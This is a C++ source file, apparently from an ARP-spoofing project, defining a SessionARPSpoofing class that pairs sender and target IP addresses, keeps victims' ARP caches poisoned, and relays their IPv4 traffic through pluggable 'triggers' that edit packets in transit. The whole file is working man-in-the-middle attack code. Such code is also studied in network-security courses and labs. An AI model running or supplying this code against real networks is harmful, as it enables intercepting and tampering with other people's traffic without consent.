#pragma once

#include <optional>
#include <netinet/in.h>
#include <iostream>
#include <pcap.h>
#include "session/ARPSessionAdaptor.cpp"
#include "BaseARPSpoofing.cpp"
#include "trigger/BaseTrigger.cpp"

class SessionARPSpoofing: public BaseARPSpoofing {
private:
    std::vector<std::pair<uint8_t*, uint8_t*>> sessionList;

    ARPSessionAdaptor* arpSessionAdaptor;

    std::vector<BaseTrigger*> triggers;

public:
    explicit SessionARPSpoofing(char *networkInterface,
                                std::vector<std::pair<uint8_t *, uint8_t *>> sessionList):
            BaseARPSpoofing(networkInterface), sessionList(sessionList),
            arpSessionAdaptor(new ARPSessionAdaptor(networkInterface)) {}

    void registerTrigger(BaseTrigger* ipv4Trigger) {
        this->triggers.push_back(ipv4Trigger);
    }

    void buildSession() {
        std::cout << "INFO: start scanning sender clients..." << std::endl;
        for (auto session: this->sessionList) {
            auto senderIP = session.first;
            auto targetIP = session.second;

            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(this->pcapHandle, &header, &packet);

            auto arpHeader = this->netFuncs->findTargetByIP(senderIP);

            if (!arpHeader) {
                std::cout << "WARNING: failed pair session; invalid target ip" << std::endl;
            } else if (this->arpSessionAdaptor->addSession(arpHeader.value(), true))
                std::cout << "INFO: find session " << senderIP << " <=> " << targetIP << "; adaptor paired!"
                          << std::endl;
            else std::cout << "WARNING: failed pair session; too much sessions" << std::endl;
        }

        std::cout << "INFO: success scanning sender clients" << std::endl;
    }

    void startARPSpoofing(int sessionTime) override {
        this->buildSession();
        this->setUpTimer(sessionTime);

        std::cout << "INFO: start spoof-spoofing..." << std::endl;

        while (this->isAlive()) {
            struct pcap_pkthdr* header;
            const u_char* packet;
            pcap_next_ex(this->pcapHandle, &header, &packet);

            auto *etherHeader = (EtherHeader*) packet;
            switch (ntohs(etherHeader->type)) {
                case ETHER_TYPE_ARP: {
                    auto arpHeader = (ARPHeader*) (packet + sizeof(EtherHeader));
                    auto session = this->arpSessionAdaptor->getSession(etherHeader->d_host);
                    if (session) session.value()->receiveARPRequestPacket(this->pcapHandle, arpHeader);
                } break;
                case ETHER_TYPE_IPV4: {
                    auto session = this->arpSessionAdaptor->getSession(etherHeader->d_host);
                    if (session) {
                        for (auto trigger: this->triggers) trigger->editIPV4Packet(const_cast<u_char *>(packet));
                        session.value()->receiveIPV4Packet(this->pcapHandle, const_cast<u_char *>(packet));
                    }
                } break;
            }
        }

        std::cout << "INFO: end spoof-spoofing; timeout." << std::endl;
    }
};
